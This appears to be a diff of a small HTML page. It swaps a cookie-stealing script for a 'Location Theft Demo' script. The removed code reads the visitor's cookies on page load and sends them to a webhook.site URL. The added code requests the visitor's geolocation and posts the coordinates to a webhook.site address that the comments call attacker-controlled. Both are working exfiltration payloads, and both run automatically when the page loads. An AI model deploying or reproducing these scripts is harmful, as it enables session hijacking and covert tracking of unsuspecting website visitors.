@@ -1,32 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Welcome</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Theft Demo</title>
 </head>
 <body>
-    <h1>Welcomee to My Website!</h1>
-    <p>Please wait...</p>
-   <script>
-    function stealCookies() {
-        // Get all cookies
-        var cookies = document.cookie;
-        
-        // Log cookies to the console for debugging
-        console.log("Captured Cookies: ", cookies);
+    <h1>Welcome to My Website!</h1>
+    <p>We are capturing your location and sending it elsewhere.</p>
 
-        // Send cookies to Webhook.site
-        fetch('https://webhook.site/5ade5b56-971d-43fb-a0d3-96c3e5fdd355', {  // Replace with your Webhook URL
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ stolenCookies: cookies })
-        });
-    }
+    <script>
+        // Function to get user location and send it to the attacker
+        function stealLocation() {
+            if ("geolocation" in navigator) {
+                // Ask the user for their location
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Extract latitude and longitude
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
 
-    // Call the function to steal cookies
-    stealCookies();
-</script>
+                    // Log location for testing
+                    console.log("Captured Location:", latitude, longitude);
 
+                    // Send location to an attacker-controlled server (Webhook.site in this case)
+                    fetch('https://webhook.site/your-unique-id', {  // Replace with your Webhook URL
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            stolenLocation: {
+                                latitude: latitude,
+                                longitude: longitude
+                            }
+                        })
+                    });
+                }, function(error) {
+                    console.error("Error getting location: " + error.message);
+                });
+            } else {
+                console.log("Geolocation not supported by this browser.");
+            }
+        }
+
+        // Call the function to steal the location
+        stealLocation();
+    </script>
 </body>
 </html>
